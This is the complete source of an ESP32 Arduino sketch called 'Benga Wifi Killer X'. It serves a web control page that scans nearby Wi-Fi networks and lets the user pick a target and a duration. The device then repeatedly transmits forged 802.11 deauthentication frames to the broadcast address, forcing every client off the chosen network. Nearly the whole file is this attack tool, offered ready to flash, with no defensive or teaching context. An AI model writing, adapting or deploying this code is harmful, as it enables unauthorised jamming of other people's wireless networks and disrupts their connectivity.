#include <WiFi.h>
#include <WebServer.h>
#include <esp_wifi.h>
#include <Adafruit_NeoPixel.h>

#define RGB_PIN 48
#define NUMPIXELS 1
Adafruit_NeoPixel pixels(NUMPIXELS, RGB_PIN, NEO_GRB + NEO_KHZ800);

WebServer server(80);
const char* ap_ssid = "BengaWifiX";
const char* ap_password = "12345678";

// Broadcast MAC address
const uint8_t broadcast_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

// WiFi scanning and attack variables
int current_channel = 1;
bool attack_active = false;
uint8_t target_bssid[6];
unsigned long attack_start_time = 0;
int attack_duration = 10;  // Default duration in seconds

// ---------------- LED Helper ----------------
void setLED(uint8_t r, uint8_t g, uint8_t b) {
  pixels.setPixelColor(0, pixels.Color(r, g, b));
  pixels.show();
}

void setup() {
  Serial.begin(115200);

  // Init LED
  pixels.begin();
  setLED(0, 0, 255); // Blue = idle

  // Start AP mode
  WiFi.softAP(ap_ssid, ap_password);
  IPAddress IP = WiFi.softAPIP();
  Serial.print("AP IP address: ");
  Serial.println(IP);

  // Set up server endpoints
  server.on("/", handleRoot);
  server.on("/scan", handleScan);
  server.on("/start", handleStartAttack);
  server.on("/stop", handleStopAttack);

  server.begin();
}

void loop() {
  server.handleClient();

  // Handle active attack
  if (attack_active) {
    if (millis() - attack_start_time < (attack_duration * 1000)) {
      sendDeauthPacket(target_bssid, broadcast_mac);
      delay(100);  // Control packet rate
    } else {
      attack_active = false;
      WiFi.softAP(ap_ssid, ap_password);
      setLED(0, 0, 255); // back to blue
    }
  }
}

void handleRoot() {
  String html = R"=====(
<!DOCTYPE html>
<html>
<head>
  <title>Benga Wifi Killer X</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body { font-family: Arial, sans-serif; margin: 20px; }
    table { border-collapse: collapse; width: 100%; }
    th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
    th { background-color: #f2f2f2; }
    button { margin: 5px; padding: 8px 16px; }
    .container { max-width: 800px; margin: 0 auto; }
  </style>
</head>
<body>
<div class="container">
  <h1>Benga Wifi Killer X </h1>
  <button onclick="scanNetworks()">Scan Networks</button>
  <div id="networks"></div>
  <div id="attack-control" style="display:none; margin-top:20px;">
    <h2>Attack Control</h2>
    <p>Target: <span id="target-ssid"></span></p>
    <p>Duration: <input type="number" id="duration" value="10" min="1" max="60"> seconds</p>
    <button onclick="startAttack()">Start Attack</button>
    <button onclick="stopAttack()">Stop Attack</button>
  </div>
</div>

<script>
function scanNetworks() {
  fetch('/scan')
    .then(response => response.json())
    .then(data => {
      if (data.length === 0) {
        document.getElementById('networks').innerHTML = '<p>No networks found</p>';
        return;
      }
      
      let table = '<table><tr><th>SSID</th><th>BSSID</th><th>Channel</th><th>Signal</th><th>Action</th></tr>';
      data.forEach(network => {
        table += `<tr>
          <td>${network.ssid}</td>
          <td>${network.bssid}</td>
          <td>${network.channel}</td>
          <td>${network.rssi} dBm</td>
          <td><button onclick="selectTarget('${network.bssid}', '${network.ssid}')">Select</button></td>
        </tr>`;
      });
      table += '</table>';
      document.getElementById('networks').innerHTML = table;
    });
}

function selectTarget(bssid, ssid) {
  document.getElementById('target-ssid').textContent = ssid;
  document.getElementById('attack-control').style.display = 'block';
  window.selectedBSSID = bssid;
}

function startAttack() {
  const duration = document.getElementById('duration').value;
  fetch(`/start?bssid=${encodeURIComponent(window.selectedBSSID)}&duration=${duration}`)
    .then(() => alert('Attack started!'));
}

function stopAttack() {
  fetch('/stop')
    .then(() => alert('Attack stopped!'));
}
</script>
</body>
</html>
)=====";

  server.send(200, "text/html", html);
}

void handleScan() {
  setLED(255, 255, 0); // Yellow = scanning
  String json = "[";
  int numNetworks = WiFi.scanNetworks();
  
  for (int i = 0; i < numNetworks; i++) {
    if (i > 0) json += ",";
    json += "{";
    json += "\"ssid\":\"" + WiFi.SSID(i) + "\",";
    json += "\"bssid\":\"" + WiFi.BSSIDstr(i) + "\",";
    json += "\"channel\":" + String(WiFi.channel(i)) + ",";
    json += "\"rssi\":" + String(WiFi.RSSI(i));
    json += "}";
  }
  json += "]";
  
  server.send(200, "application/json", json);
  WiFi.scanDelete();
  setLED(0, 0, 255); // back to blue after scan
}

void handleStartAttack() {
  if (server.hasArg("bssid")) {
    String bssidStr = server.arg("bssid");
    if (server.hasArg("duration")) {
      attack_duration = server.arg("duration").toInt();
    }
    
    sscanf(bssidStr.c_str(), "%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx", 
           &target_bssid[0], &target_bssid[1], &target_bssid[2],
           &target_bssid[3], &target_bssid[4], &target_bssid[5]);
    
    attack_active = true;
    attack_start_time = millis();
    
    // Switch to monitor mode for attack
    WiFi.mode(WIFI_OFF);
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);
    esp_wifi_set_mode(WIFI_MODE_STA);
    esp_wifi_start();
    esp_wifi_set_promiscuous(true);

    setLED(255, 0, 0); // Red = attacking
    
    server.send(200, "text/plain", "Attack started");
  } else {
    server.send(400, "text/plain", "Missing BSSID parameter");
  }
}

void handleStopAttack() {
  attack_active = false;
  WiFi.softAP(ap_ssid, ap_password);
  setLED(0, 0, 255); // back to blue
  server.send(200, "text/plain", "Attack stopped");
}

void sendDeauthPacket(const uint8_t* bssid, const uint8_t* sta) {
  uint8_t packet[26] = {
    0xC0, 0x00,
    0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00,
    0x01, 0x00
  };

  memcpy(packet + 4, sta, 6);
  memcpy(packet + 10, bssid, 6);
  memcpy(packet + 16, bssid, 6);

  esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
}
